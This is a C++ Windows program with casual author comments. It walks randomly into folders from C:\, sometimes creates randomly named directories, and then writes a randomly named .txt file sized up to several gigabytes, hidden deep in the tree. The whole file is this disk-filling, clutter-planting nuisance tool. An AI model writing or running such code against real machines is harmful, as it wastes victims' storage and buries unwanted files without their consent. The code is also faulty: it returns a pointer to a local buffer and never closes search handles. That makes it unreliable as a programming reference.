#include <stdio.h>
#include <iostream>
#include <fstream>
#include <io.h>
#include <vector>
#include <string>
#include <direct.h>
#include <windows.h>
#include <stdlib.h>
#include <time.h>
////////////////////////////////////////////////////////////////////////////////this program isnt working in xp for some reason the getrandomfilename isnt pointing correctly
using namespace std;

char* getRandomFileName();

void main()
{
	LPCTSTR searchkey;
	char s[5000] = "C:\\*";/////why d maybe c? e?f?g?h? research
	searchkey = s;

	WIN32_FIND_DATA fd;//file data

	vector<string> dirarray;//store the files into something

	char RandomFileName[50];
	int counter = 0;//this is used to remove the . and .. option from our list of options
	int megaloop = 1;
	int randomCont = 1;
	int randomNo;
	srand(time(NULL));

	while (megaloop == 1)
	{
		//create a random number for if you to continue down another directory or stop and place file here.
		randomCont = rand() % 6; //give it a 1/4 chance i guess? nah 1/3.......-0 is stop, -1 is continue, -2 is continue nah 1/6 chance
		//stop now or continue down the rabbit hole
		if (randomCont == 0)
		{
			//stop and store file in current directory
			megaloop = 0;
		}
		else
		{
			dirarray.clear();//emtpys vector to store new values in
			HANDLE h = FindFirstFile(searchkey, &fd);//this finds first file and directory but have to iterate with findnext
			//loop through all files and store directories
			do
			{
				if ((fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) && !(fd.dwFileAttributes & FILE_ATTRIBUTE_SYSTEM))
				{
					char test2[100];
					sprintf_s(test2, fd.cFileName);
					dirarray.push_back(test2);
				}
			} while (FindNextFile(h, &fd) != 0);

			//this removes the . and .. option once i leave the drive directory
			if (counter == 2)
			{
				dirarray.erase(dirarray.begin());
				dirarray.erase(dirarray.begin());
			}

			//this is debugging to print all files in directory in console.
			/*for (int i = 0; i < test.size(); i++)
			{
			cout << test[i] + "\n";
			}*/



			//create a random number which will choose the dir
			if (dirarray.size() == 0)
			{
				randomNo = 0;
			}
			else
			{
				randomNo = rand() % (dirarray.size() + 1);//add one so we can have final option to create a new directory in that path instead of choosing from current list.
			}
			//removes the last * from the directory and puts an end of line character
			int chars = strlen(s) - 1;
			s[chars] = '\0';


			//if the randomno generated is = the number of total directories + 1 that means its time to create a new directory then head down that rabbit hole
			if (randomNo == dirarray.size())//create new directory
			{
				//cout << "\n\n----------------------------------creating new dir---------------------------\n\n";//debug line
				strcpy(RandomFileName, getRandomFileName());
				strcat(s, RandomFileName);
				_mkdir(s);
			}
			else
			{
				//add the new random directory to the end of current string
				strcat(s, dirarray[randomNo].c_str());
			}



			strcat(s, "\\*");
			searchkey = s;
			//cout << "folder: " << searchkey << "\n";//debug line
		}


		//this is to stop out of range exception if the directory gets too large for my char array
		if (strlen(s) >= 4900)
		{
			megaloop = 0;
		}




		if (counter == 0)
		{
			counter = 2;
		}
	}



	int chars = strlen(s) - 1;
	s[chars] = '\0';
	

	//cout << "\n\nmaking file in: " << s;//debug line

	//get random name to use as txt file
	strcpy(RandomFileName, getRandomFileName());
	strcat(RandomFileName, ".txt");
	strcat(s, RandomFileName);
	LONG sizeKB = rand() % 1000000000;
	int toolarge = rand() % 4;//rand() % 4
	int sizeGB;
	if (toolarge != 0)
	{
		sizeGB = 0;
	}
	else
	{
		sizeGB = rand() % 10;
	}
	
	HANDLE hfile;//works with anyfiletype
	hfile = CreateFile(s, GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	LARGE_INTEGER dsize;
	dsize.LowPart = sizeKB;//1000000000 = 1gB, 1000000 = 1mB, 100000 = 100KB, 10000 = 10kB, 1000 = 1KB.
	dsize.HighPart = sizeGB; // 1 = 4194304kB, 4GB

	SetFilePointerEx(hfile, dsize, 0, FILE_END);
	SetEndOfFile(hfile);

	//cout << "\n\nmaking file in: " << s;//debug line



	//char in[10];//debug line
	//cin >> in;//debug line
}

char* getRandomFileName()
{
	//begin file name randomizer
	//-----------------------------------------------------------------------------------------------
	//srand(time(NULL));//this needs to be included but i dont think you need it again if you arleady done it in a program	
	//The file name that is randomly generated
	//char RandomFileName[50];
	char RANDISH[50];
	strcpy(RANDISH, "");//clears the name to start use
	//place to store the desired letter after converting from int
	char letter;
	//random number from 10-50 for how many characters the file name will be.chose 10 so the chance of running into a file or folder with the same name is highly unlikely.....highly...unlikely :S...
	int randomlength;
	randomlength = rand() % 36 + 10;//changed to 36 to give room for (.txt and end of file \0) appending
	//cout << randomlength;//debug line
	//random number from 0-26 to pick a letter of the alphabet.
	int randomletterint;
	int i = 0;
	for (i = 0; i <= randomlength; i++)
	{
		randomletterint = rand() % 26;//randomizers a number from the 26 chars of english alphabet
		letter = (char)(randomletterint + 97);//converts the random number to a letter
		RANDISH[i] = letter;//stores letter in the next position for filename		
		//cout << "\n" << (char)(randomletterint + 97);//debug line
	}
	RANDISH[i] = '\0';
	//cout << RANDISH << "\n";//debugline
	//-----------------------------------------------------------------------------------------
	//end file name randomizer


	return RANDISH;
}
